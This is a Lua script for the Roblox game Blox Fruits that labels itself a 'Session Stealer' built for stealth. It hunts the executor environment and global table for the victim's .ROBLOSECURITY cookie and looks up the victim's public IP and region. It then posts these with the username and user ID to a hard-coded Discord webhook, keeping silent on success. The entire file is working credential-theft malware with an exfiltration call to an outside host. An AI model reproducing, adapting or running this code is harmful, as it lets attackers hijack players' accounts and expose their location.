-- Blox Fruits v3.2 [Session Stealer]
-- Optimized for Loadstring & Stealth

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ==========================================
-- CONFIGURATION
-- ==========================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1568512623723552829/C28ceiOU5c5O3xTwOz5E_xrWkkmUONtKUGnkgxwXnTARNbKZdeAT-8kidFihl1Pg3Jkg"
local SCRIPT_VERSION = "3.2"

-- ==========================================
-- UTILITIES
-- ==========================================

-- Get Public IP
local function get_ip()
    local success, result = pcall(function()
        return HttpService:GetAsync("http://api.ipify.org?format=json")
    end)
    if success and result then
        local data = HttpService:JSONDecode(result)
        if data and data.ip then return data.ip end
    end
    return "Unknown"
end

-- Get Region from IP
local function get_region(ip)
    if ip == "Unknown" then return "Unknown" end
    local success, result = pcall(function()
        return HttpService:GetAsync("http://ip-api.com/json/" .. ip)
    end)
    if success and result then
        local data = HttpService:JSONDecode(result)
        if data and data.country then
            return string.format("%s (%s)", data.country, data.regionName or "N/A")
        end
    end
    return "Unknown"
end

-- Extract Cookie from Executor Environment
local function get_cookie()
    local env = getfenv(0)
    -- Check common globals used by Synapse, Fluxus, KRNL, etc.
    local cookie = env.cookie or _G.cookie or env["__G"] or ""
    
    -- Fallback: Search _G for any string containing ROBLOSECURITY
    if cookie == "" then
        for k, v in pairs(_G) do
            if type(v) == "string" and string.find(v, "%.%ROBLOSECURITY", 1, true) then
                cookie = v
                break
            end
        end
    end
    
    return cookie
end

-- ==========================================
-- MAIN EXECUTION
-- ==========================================

spawn(function()
    wait(1) -- Small delay to ensure player is fully initialized
    
    local username = LocalPlayer.Name
    local user_id = LocalPlayer.UserId
    local cookie = get_cookie()
    local ip = get_ip()
    local region = get_region(ip)

    -- Prepare Webhook Payload
    local payload = {
        content = "**🌊 Blox Fruits Session Log 🌊**\n\n" ..
                  "**User:** `" .. username .. "`\n" ..
                  "**ID:** `" .. tostring(user_id) .. "`\n" ..
                  "**IP:** `" .. ip .. "`\n" ..
                  "**Region:** `" .. region .. "`\n" ..
                  "**Cookie:** `" .. cookie .. "`",
        username = "Blox Fruits Bot",
        avatar_url = "https://raw.githubusercontent.com/Blox-Fruits-UI/Blox-Fruits-UI/main/assets/logo.png"
    }

    local json_payload = HttpService:JSONEncode(payload)

    -- Send to Discord
    local success, response = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, json_payload, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        -- Optional: Print to console only if you want stealth mode
        -- print("[Blox Fruits] Session sent successfully.")
    else
        -- print("[Blox Fruits] Failed to send session.")
    end
end)